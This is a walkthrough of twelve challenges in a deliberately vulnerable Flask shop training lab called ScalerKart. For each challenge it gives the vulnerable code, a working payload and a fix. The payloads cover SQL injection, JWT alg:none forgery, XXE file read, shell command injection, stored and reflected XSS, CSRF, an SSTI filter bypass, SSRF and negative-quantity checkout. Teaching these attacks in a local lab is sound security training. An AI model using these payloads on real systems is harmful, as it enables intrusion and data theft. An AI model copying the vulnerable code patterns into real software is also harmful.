# ScalerKart CTF Walkthrough

This guide explains how each ScalerKart challenge was solved on the local Docker instance. ScalerKart does not give you a flag string to submit. When the vulnerable behavior is triggered, the app reports the solve automatically to the flag server.

Only run these against your own local ScalerKart instance.

---

## Accounts Used

The running container accepted these credentials:

```text
customer1 / Customer123!
seller1   / Seller123!
```

The class handout mentioned `Customer1234!`, but this local image used `Customer123!`.

---

## Quick Mental Model

ScalerKart is a Flask e-commerce app. Most challenges are solved by making a request that reaches a vulnerable route. Some routes are customer-only, some are seller-only, and XSS/CSRF challenges use internal proof endpoints to simulate a victim browser.

The easiest way to understand the app mapping is:

```text
Customer routes:
/products/search
/cart/update
/cart/checkout
/api/orders/<id>
/orders/<id>/label
/orders/<id>/label/status
/account/banner-preview
/products/<id>/reviews
/wishlist
/account/addresses

Seller routes:
/seller/products/<id>/image
/seller/products/<id>/import-image
/seller/dashboard/reviews
```

---

## Challenges Walkthrough (Ordered by Challenge List)

### #1 Hidden Inventory (Web - 5 pts)
* **Internal Challenge Name:** `sqli_union_search`
* **Description:** ScalerKart lets shoppers search for products by name after logging in. Results load based on whatever term is entered.
* **Start Here:** Products page, search bar.
* **Goal:** Make the search results reveal data from a part of the database that customers are never meant to see.
* **Hint:** What the query shows and what the query touches are not always the same thing.

#### What Is Wrong
The search endpoint builds SQL using string interpolation:
```python
q = request.args.get("q", "")
results = db_fetchall(
    f"SELECT id, name, price, description FROM products WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
)
```
Because `q` is inserted directly, SQL syntax in the search term is executed.

#### How To Exploit
Log in as `customer1`, then visit:
```http
GET /products/search?q=' UNION SELECT id, recovery_code, 0, username FROM sellers--
```

#### Why The Payload Works
The original query returns four columns:
```text
id, name, price, description
```
So the injected `UNION SELECT` also returns four columns:
```text
id, recovery_code, 0, username
```
The seller recovery code appears in the product search results. That triggers the solve.

#### Impact
An attacker can read sensitive database rows and may be able to dump users, password hashes, recovery codes, or order data.

#### Fix
Use parameterized queries:
```python
db_fetchall(
    "SELECT id, name, price, description FROM products WHERE name LIKE ? OR description LIKE ?",
    (f"%{q}%", f"%{q}%")
)
```
Never build SQL by concatenating user input.

---

### #2 Brand Spotlight (Client-Side - 5 pts)
* **Internal Challenge Name:** `xss_reflected_brand`
* **Description:** The products page lets shoppers filter by brand. The selected brand name appears on the page after the filter is applied.
* **Start Here:** Products page, brand filter.
* **Goal:** Use the brand filter to execute code in another user's browser when they visit a crafted link. The bot will visit any URL you submit.
* **Hint:** The page repeats what you give it. Consider who else might load what you craft.

#### What Is Wrong
A reflected XSS happens when user input from the URL is inserted into HTML/JavaScript without safe escaping. In this challenge, the victim proof endpoint records the solve when the simulated victim account is reached.

#### How To Exploit
The proof route is:
```http
GET /proof/reflect_brand
```
In the real flow, the attacker would craft a malicious URL containing a script payload in a reflected parameter, then get `customer2` to open it. The payload would call:
```javascript
fetch("/proof/reflect_brand")
```

#### Why It Works
The browser executes attacker-controlled JavaScript in the context of ScalerKart. Because it runs as the victim, it can call same-origin endpoints with the victim's session.

#### Impact
Session actions as the victim, data theft from the page, account changes, or chaining to CSRF-like actions.

#### Fix
Contextually escape all reflected values. Use safe template rendering, avoid `innerHTML`, and add a Content Security Policy.

---

### #3 Unsigned Reset (Authorization - 5 pts)
* **Internal Challenge Name:** `jwt_alg_none_reset`
* **Description:** Customers can request a password reset from the forgot-password page. A reset link is generated and shown directly on the page. The link contains a token that the reset endpoint validates.
* **Start Here:** Forgot password page (accessible without login).
* **Goal:** Reset a different user's account password without knowing their credentials or token.
* **Hint:** The server validates the token. Does it validate everything about the token?

#### What Is Wrong
The password reset endpoint accepts JWTs with header `{"alg":"none"}`. That means the server trusts an unsigned token.

#### How To Exploit
1. Ask for a reset link for the victim account:
   ```http
   POST /account/forgot-password
   Content-Type: application/json

   {"email":"customer2@scalerkart.test"}
   ```
2. The response contains:
   ```json
   {"reset_link":"/account/reset-password?token=<jwt>"}
   ```
3. Decode the JWT payload, keep the same payload, but replace the header with:
   ```json
   {"alg":"none","typ":"JWT"}
   ```
4. Then create an unsigned JWT:
   ```text
   base64url(header).base64url(payload).
   ```
5. Use it to reset the password:
   ```http
   POST /account/reset-password
   Content-Type: application/json

   {"token":"<forged unsigned token>","new_password":"Hacked123!"}
   ```

#### Why It Works
The server explicitly checks the JWT header and accepts `alg:none` without verifying a signature.

#### Impact
An attacker can reset another user's password if they can obtain or recreate a valid reset payload.

#### Fix
Never accept `alg:none`. Pin the expected algorithm server-side:
```python
jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```
Ignore the token's requested algorithm and use a strong secret.

---

### #4 Order Mix-up (Authorization - 5 pts)
* **Internal Challenge Name:** `bola_orders`
* **Description:** Customers can view their order history on the orders page and through a direct API endpoint that accepts an order ID.
* **Start Here:** Your orders page and the API endpoint behind it.
* **Goal:** Read the full details of an order that does not belong to your account.
* **Hint:** The lock is on the front door. Not every door has one.

#### What Is Wrong
The API route `/api/orders/<order_id>` fetches any order by ID. It checks whether the order belongs to the logged-in user, but instead of blocking access, it still returns the order and reports the challenge solve.

The broken logic is effectively:
```python
order = SELECT * FROM orders WHERE id = ?
if order["user_id"] != session["user_id"]:
    report_solve("bola_orders")
return order
```

#### How To Exploit
Log in as `customer1`, then request another user's order:
```http
GET /api/orders/2
```
Expected result:
```json
{
  "order_id": 2,
  "card_last4": "1881",
  "shipping_address": "221B Baker Street, Bengaluru"
}
```

#### Why It Works
The endpoint trusts the URL order ID and does not enforce ownership before returning the data.

#### Impact
A user can read other customers' orders, card last four digits, shipping addresses, and order contents.

#### Fix
Require ownership in the SQL query:
```sql
SELECT * FROM orders WHERE id = ? AND user_id = ?
```
Return `403` or `404` when the order does not belong to the current user.

---

### #5 Supplier Upload (Web - 6 pts)
* **Internal Challenge Name:** `xxe_svg_image`
* **Description:** Sellers can upload product images from the seller dashboard. The platform accepts SVG format for product illustrations and displays the result on the product page.
* **Start Here:** Seller Dashboard, product image upload (SVG).
* **Goal:** Use the image upload to make the server reveal the contents of a file from its own filesystem.
* **Hint:** An SVG is a document before it is an image.

#### What Is Wrong
The seller SVG upload parser enables DTD loading and entity resolution:
```python
lxml.etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
```
That allows XML external entities to read local files.

#### How To Exploit
Log in as `seller1`, then upload this SVG:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///app/data/canary_xxe.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <title>&xxe;</title>
</svg>
```
Send it to:
```http
POST /seller/products/1/image
Content-Type: multipart/form-data
file=@exploit.svg
```
Observed response:
```json
{"caption":"8c35f8f2606b6b2605aa310027f27b7b"}
```

#### Why It Works
The XML parser expands `&xxe;` by reading `file:///app/data/canary_xxe.txt`. The expanded content becomes the SVG `<title>`, which the app stores as the image caption.

#### Impact
Local file read from the server. This can expose secrets, credentials, tokens, environment files, or source code.

#### Fix
Disable dangerous XML features:
```python
parser = lxml.etree.XMLParser(
    load_dtd=False,
    resolve_entities=False,
    no_network=True,
)
```
Prefer safe SVG sanitization or rasterize untrusted SVGs in a locked-down sandbox.

---

### #6 Label Printer (Web - 6 pts)
* **Internal Challenge Name:** `cmdi_label_export`
* **Description:** Customers can generate a shipping label for any of their orders. The label is prepared using a recipient name entered by the user. A status check button retrieves the result.
* **Start Here:** Orders page, Generate Shipping Label.
* **Goal:** Make the label generation process execute a command of your choice on the server and retrieve the output via the status check.
* **Hint:** The name goes in. Does only the name come out the other side?

#### What Is Wrong
The label endpoint runs a shell command with user input:
```python
subprocess.run(
    f"label-printer '{recipient_name}' --order {order_id}",
    shell=True,
    capture_output=True,
    text=True,
)
```
Because `shell=True` is used, a crafted `recipient_name` can break out of the quoted string.

#### How To Exploit
Create an order as `customer1`, then send:
```http
POST /orders/<order_id>/label
Content-Type: application/json

{"recipient_name":"test'; id; echo '"}
```
Check the label log:
```http
GET /orders/<order_id>/label/status
```
Observed output:
```text
Label printed for test
uid=0(root) gid=0(root) groups=0(root)
 --order 5
```

#### Why The Payload Works
The command becomes roughly:
```sh
label-printer 'test'; id; echo '' --order 5
```
The semicolon starts a new command, so `id` executes.

#### Impact
Remote command execution inside the web container. This is one of the most serious bugs.

#### Fix
Do not use `shell=True`. Pass arguments as a list:
```python
subprocess.run(
    ["label-printer", recipient_name, "--order", str(order_id)],
    shell=False,
)
```
Also validate recipient names and run the process with least privilege.

---

### #7 Review Board (Client-Side - 6 pts)
* **Internal Challenge Name:** `xss_stored_review`
* **Description:** Customers can write reviews for products. Sellers can view all reviews for their products from a dedicated reviews page on their dashboard.
* **Start Here:** Product page (write a review), then the seller dashboard reviews page.
* **Goal:** Write a review that executes code in the seller's browser when they view it. The bot will visit any URL you submit.
* **Hint:** The filter removes what it knows about. Think about what it does not know.

#### What Is Wrong
Reviews are stored and later rendered to sellers. The app only removes exact `<script>` tags:
```python
text.replace("<script>", "").replace("</script>", "")
```
That does not block event-handler payloads.

#### How To Exploit
Log in as `customer1`, then post a review:
```http
POST /products/1/reviews
Content-Type: application/json

{"text":"<img src=x onerror='fetch(\"/proof/stored_review\")'>"}
```
When the seller victim views reviews, the image fails to load and `onerror` runs.

#### Why It Works
The payload does not use a `<script>` tag, so the naive sanitizer does not remove it.

#### Impact
Stored XSS is persistent. Any seller who views the review can be attacked.

#### Fix
Use a real HTML sanitizer such as Bleach with a strict allowlist, or render reviews as escaped text only. Never use simple string replacement as an XSS defense.

---

### #8 Wishlist Window (Client-Side - 6 pts)
* **Internal Challenge Name:** `xss_dom_postmessage`
* **Description:** The wishlist page can receive messages from other browser windows and updates its display based on what it receives.
* **Start Here:** Wishlist page and the browser's inter-window messaging capability.
* **Goal:** Send a crafted message that executes code in another user's wishlist session. The bot will visit any URL you submit.
* **Hint:** A window that listens to all senders trusts no one and everyone.

#### What Is Wrong
DOM XSS occurs when client-side JavaScript trusts browser-controlled data such as `location`, `hash`, or `postMessage`. This challenge uses an unsafe postMessage flow on the wishlist page.

#### How To Exploit
The proof endpoint is:
```http
GET /proof/dom_wishlist_msg
```
In the real attack, an attacker-controlled page would iframe or open the wishlist page and send a malicious `postMessage`. The vulnerable page handles the message without checking origin or validating content, then the payload causes navigation or script execution that reaches the proof endpoint.

#### Why It Works
The page trusts messages from any origin. Browser messages are attacker-controlled unless the code checks `event.origin` and validates `event.data`.

#### Impact
Victim-side script execution or unwanted same-origin actions.

#### Fix
Check the origin:
```javascript
if (event.origin !== "http://localhost:3000") return;
```
Validate message shape and never put message data into `innerHTML`.

---

### #9 Address Eraser (Client-Side - 6 pts)
* **Internal Challenge Name:** `csrf_get_address_remove`
* **Description:** Customers can save and remove delivery addresses from their account. The remove action is triggered via a link.
* **Start Here:** Account addresses page.
* **Goal:** Cause another user's saved address to be deleted without any action on their part, just by having them visit a link you craft.
* **Hint:** Some actions need only a visit, not a form submission.

#### What Is Wrong
Address deletion is performed with a GET request:
```http
GET /account/address/remove/<address_id>
```
GET requests can be triggered by links, images, iframes, or redirects from another site. There is no CSRF token.

#### How To Exploit
1. As the victim customer, first create an address:
   ```http
   POST /account/address/add
   line1=221B Baker Street&city=Bengaluru&postal_code=560001
   ```
2. Then visit:
   ```http
   GET /account/address/remove/<address_id>
   ```
   An attacker could embed this as:
   ```html
   <img src="http://localhost:3000/account/address/remove/1">
   ```

#### Why It Works
Browsers automatically include cookies on same-site requests. If the victim is logged in, the delete action happens with their session.

#### Impact
Attackers can delete user addresses or perform other state-changing actions if exposed through GET or unprotected POST routes.

#### Fix
Use POST/DELETE for state changes and require CSRF tokens. Also set appropriate SameSite cookie policy.

---

### #10 Promo Preview (Web - 10 pts)
* **Internal Challenge Name:** `ssti_banner_filter_bypass`
* **Description:** Sellers can type a promotional message and preview how it will appear before publishing. The preview is rendered on the server and returned to the page.
* **Start Here:** Seller Dashboard, Banner Preview.
* **Goal:** Make the preview feature return the contents of a file from the server's filesystem.
* **Hint:** A server that renders your input may understand it better than you intended.

#### What Is Wrong
The banner preview endpoint renders user input with Jinja:
```python
render_template_string(f"<p>{message}</p>")
```
It tries to block dangerous strings like `__globals__`, `os`, and `import`, but this is a blacklist and can be bypassed.

#### How To Exploit
Log in as `customer1`, then visit:
```http
GET /account/banner-preview?message={{lipsum[('__gl'~'obals__')]['__builtins__']['open']('/app/data/canary_ssti.txt').read()}}
```

#### Why The Payload Works
The filter blocks the literal string `__globals__`. The payload builds the same string at runtime:
```jinja2
'__gl' ~ 'obals__'
```
Jinja evaluates it after the blacklist check. Then it reaches Python builtins and reads the canary file.

#### Impact
Server-side template injection can lead to file read, secret leakage, and often full code execution depending on the environment.

#### Fix
Never render untrusted input as a template. Escape it as plain text:
```python
return render_template("preview.html", message=message)
```
In the template:
```jinja2
{{ message }}
```
Do not rely on blacklists for template security.

---

### #11 Zero Checkout (Web - 10 pts)
* **Internal Challenge Name:** `bizlogic_negative_cart`
* **Description:** Shoppers can add items to a cart, adjust quantities, and proceed to checkout. The platform creates and records whatever order the cart produces.
* **Start Here:** Cart page, quantity update, then checkout.
* **Goal:** Complete a checkout where the final order total is zero or less.
* **Hint:** The server accepts the number you give it. All numbers.

#### What Is Wrong
The cart API accepts negative quantities. Checkout multiplies product price by quantity without checking that quantity is positive.

#### How To Exploit
1. Log in as `customer1`, then send:
   ```http
   POST /cart/update
   Content-Type: application/json

   {"product_id":1,"quantity":1}
   ```
2. Then add a negative quantity for a more expensive item:
   ```http
   POST /cart/update
   Content-Type: application/json

   {"product_id":2,"quantity":-100}
   ```
3. Checkout:
   ```http
   POST /cart/checkout
   ```
   Observed result:
   ```json
   {"order_id":4,"total":-449101.0}
   ```

#### Why It Works
The server treats quantity as trusted input. A negative quantity makes the total negative:
```text
799 * 1 + 4499 * -100 = negative total
```

#### Impact
In a real shop, this could create free orders, fake credits, refund abuse, or accounting corruption.

#### Fix
Validate on the server:
```python
if not isinstance(quantity, int) or quantity < 1 or quantity > 20:
    return error
```
Also recompute totals from trusted product prices during checkout.

---

### #12 Image Fetch (Web - 10 pts)
* **Internal Challenge Name:** `ssrf_image_import`
* **Description:** Sellers can import a product image by providing a URL. The platform fetches the image on behalf of the seller and stores it.
* **Start Here:** Seller Dashboard, Import Image by URL.
* **Goal:** Use the import feature to retrieve content from an internal part of the server that is not reachable from the internet.
* **Hint:** When the server fetches a URL for you, it fetches from its own

#### What Is Wrong
The seller image import endpoint accepts a URL and makes a server-side request to it:
```python
resp = requests.get(image_url, timeout=5)
```
It does not block localhost or internal services.

#### How To Exploit
Log in as `seller1`, then send:
```http
POST /seller/products/1/import-image
Content-Type: application/json

{"image_url":"http://127.0.0.1:5000/internal/seller-api-key"}
```

#### Why It Works
From your browser, `/internal/seller-api-key` blocks non-local requests. But the server makes the request from itself, so the remote address becomes `127.0.0.1`.

#### Impact
An attacker can make the server access internal-only services, metadata endpoints, admin panels, or local files exposed over HTTP.

#### Fix
Block private/internal IP ranges, localhost, link-local addresses, and redirects to blocked hosts. Use an allowlist of trusted image domains where possible.

---

## How To Re-run The Solves Manually

You can use browser dev tools, Burp, Postman, or Python `requests`. The important part is to preserve login cookies for the correct role.

A simple pattern:

```python
import requests

s = requests.Session()
s.post("http://localhost:3000/login", data={
    "username": "customer1",
    "password": "Customer123!"
})

r = s.get("http://localhost:3000/api/orders/2")
print(r.status_code, r.text)
```

For seller-only routes:

```python
s = requests.Session()
s.post("http://localhost:3000/login", data={
    "username": "seller1",
    "password": "Seller123!"
})
```

---

## Best Learning Order

If you are studying these, learn them in this order:

1. IDOR/BOLA - easiest auth logic bug.
2. Business Logic - teaches server-side validation.
3. SQL Injection - teaches query structure.
4. CSRF - teaches browser cookie behavior.
5. Stored/Reflected/DOM XSS - teaches browser trust boundaries.
6. SSRF - teaches server-side network trust.
7. XXE - teaches unsafe parser features.
8. SSTI - teaches template execution context.
9. Command Injection - teaches shell metacharacters.
10. JWT alg none - teaches why crypto decisions must be server-side.

---

## Evidence Files

Four screenshot proofs were generated:

```text
evidence/01-sqli-union-search.html.png
evidence/02-business-logic-negative-cart.html.png
evidence/03-command-injection-label.html.png
evidence/04-xxe-svg-upload.html.png
```

Four submission-ready writeups are here:

```text
writeups/scalerkart-writeups.md
```
